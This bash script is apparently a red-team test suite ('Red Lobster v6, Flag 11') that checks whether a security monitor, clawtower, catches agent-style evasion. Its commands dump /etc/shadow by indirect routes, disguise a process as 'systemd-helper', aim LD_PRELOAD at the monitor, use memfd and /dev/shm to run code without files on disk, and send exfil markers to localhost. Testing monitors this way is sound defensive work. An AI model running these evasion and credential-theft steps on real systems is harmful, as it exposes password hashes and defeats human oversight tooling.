#!/usr/bin/env bash
# Red Lobster v6 — Flag 11: CUSTOM TOOLING — Agent-compiled evasion
# Fixed: uses rl_run instead of nonexistent rl_attack
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag11" "Flag 11: CUSTOM TOOLING — Agent-compiled evasion (v6)"

OUTDIR="$FLAG_DIR"
BUILDDIR="$FLAG_DIR/build"
mkdir -p "$BUILDDIR"

HAS_GCC=false
command -v gcc &>/dev/null && HAS_GCC=true

# 1. Compile + run static raw syscall binary
if $HAS_GCC && [[ -f "$SCRIPT_DIR/redlobster-v5-flag11-rawread.c" ]]; then
  rl_run "static raw syscall binary" \
    "gcc -static -o '$BUILDDIR/rawread' '$SCRIPT_DIR/redlobster-v5-flag11-rawread.c' 2>/dev/null && '$BUILDDIR/rawread'"
else
  rl_run "static raw syscall binary (no gcc)" \
    "echo 'SKIP: gcc not available'"
fi

# 2. insmod attempt
rl_run "insmod attempt" \
  "sudo insmod /tmp/nonexistent.ko 2>/dev/null"

# 3. LD_PRELOAD targeting clawtower
rl_run "LD_PRELOAD targeting clawtower" \
  "sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/clawtower --version 2>/dev/null"

# 4. fork + /proc/self/comm rename (hide as systemd)
rl_run "fork + comm rename" \
  "python3 -c \"
import os, ctypes
libc = ctypes.CDLL('libc.so.6')
pid = os.fork()
if pid == 0:
    libc.prctl(15, b'systemd-helper', 0, 0, 0)
    os.system('cat /etc/shadow > $OUTDIR/11_4.txt 2>/dev/null')
    os._exit(0)
else:
    os.waitpid(pid, 0)
\""

# 5. memfd_create fileless exec
if $HAS_GCC && [[ -f "$SCRIPT_DIR/redlobster-v5-flag11-memfd.c" ]]; then
  rl_run "memfd_create fileless exec" \
    "gcc -o '$BUILDDIR/memfd' '$SCRIPT_DIR/redlobster-v5-flag11-memfd.c' 2>/dev/null && '$BUILDDIR/memfd'"
else
  rl_run "memfd_create fileless exec (no gcc)" \
    "echo 'SKIP: gcc not available'"
fi

# 6. Python raw socket exfil (no curl/wget)
rl_run "python3 raw socket exfil" \
  "python3 -c \"
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect(('127.0.0.1', 19999))
    s.sendall(b'EXFIL-RAW-v6')
except: pass
finally: s.close()
\""

# 7. Python ctypes UDP sendto
rl_run "python3 ctypes UDP sendto" \
  "python3 -c \"
import ctypes, struct, socket as S
libc = ctypes.CDLL('libc.so.6')
fd = libc.socket(S.AF_INET, S.SOCK_DGRAM, 0)
addr = struct.pack('!HH4s8s', S.AF_INET, S.htons(19999), S.inet_aton('127.0.0.1'), b'\\x00'*8)
libc.sendto(fd, b'EXFIL-UDP-v6', 12, 0, addr, 16)
libc.close(fd)
\""

# 8. Python compile() + exec() dynamic code gen
rl_run "python3 compile+exec dynamic code" \
  "python3 -c \"
code = compile('import os; os.system(\\\"cat /etc/passwd > $OUTDIR/11_8.txt\\\")', '<string>', 'exec')
exec(code)
\""

# 9. Bash process substitution
rl_run "bash process substitution" \
  "cat <(cat /etc/shadow) > $OUTDIR/11_9.txt 2>/dev/null"

# 10. Python tempfile + shutil (write to named tempfile, then copy)
rl_run "python3 tempfile+shutil chain" \
  "python3 -c \"
import tempfile, shutil, os
with tempfile.NamedTemporaryFile(delete=False, suffix='.log') as f:
    shutil.copyfileobj(open('/etc/shadow','rb'), f)
    tmp = f.name
shutil.move(tmp, '$OUTDIR/11_10.txt')
\" 2>/dev/null"

# 11. Node dgram UDP exfil
rl_run "node dgram UDP exfil" \
  "node -e \"
const dgram = require('dgram');
const msg = Buffer.from('EXFIL-NODE-UDP-v6');
const c = dgram.createSocket('udp4');
c.send(msg, 19999, '127.0.0.1', ()=>c.close());
setTimeout(()=>process.exit(0), 1000);
\""

# 12. Write + chmod + exec a script in /dev/shm (tmpfs, no disk)
rl_run "script in /dev/shm (tmpfs)" \
  "echo '#!/bin/bash' > /dev/shm/rl6_payload.sh; echo 'cat /etc/shadow' >> /dev/shm/rl6_payload.sh; chmod +x /dev/shm/rl6_payload.sh; /dev/shm/rl6_payload.sh > $OUTDIR/11_12.txt 2>/dev/null; rm -f /dev/shm/rl6_payload.sh"

rm -rf "$BUILDDIR"
rl_summary
rl_cleanup
